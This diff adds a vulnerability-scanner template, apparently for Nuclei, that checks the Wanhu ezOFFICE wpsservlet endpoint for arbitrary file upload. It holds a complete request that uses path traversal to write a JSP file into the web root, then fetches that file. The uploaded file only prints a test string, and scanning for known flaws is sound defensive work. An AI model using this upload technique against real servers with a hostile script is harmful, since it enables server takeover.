@@ -1,0 +1,43 @@
+id: wanhu-ezoffice-wpsservlet-upload
+
+info:
+  name: wanhu-ezoffice-wpsservlet-upload
+  author: fhq
+  severity: high
+  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。此系统wpsservlet存在任意文件上传。攻击者可上传恶意脚本文件获取服务器权限。
+
+requests:
+  - raw:
+      - |-
+        POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=check&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=55aeb894de1521afe560c924fad7c6fb
+        Content-Length: 200
+
+        --55aeb894de1521afe560c924fad7c6fb
+        Content-Disposition: form-data; name="NewFile"; filename="check.jsp"
+
+        <% out.print("This website has a vulnerability!!!");%>
+        --55aeb894de1521afe560c924fad7c6fb--
+
+      - |
+        GET /defaultroot/platform/portal/layout/check.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'vulnerability'
+      - type: status
+        status:
+          - 200
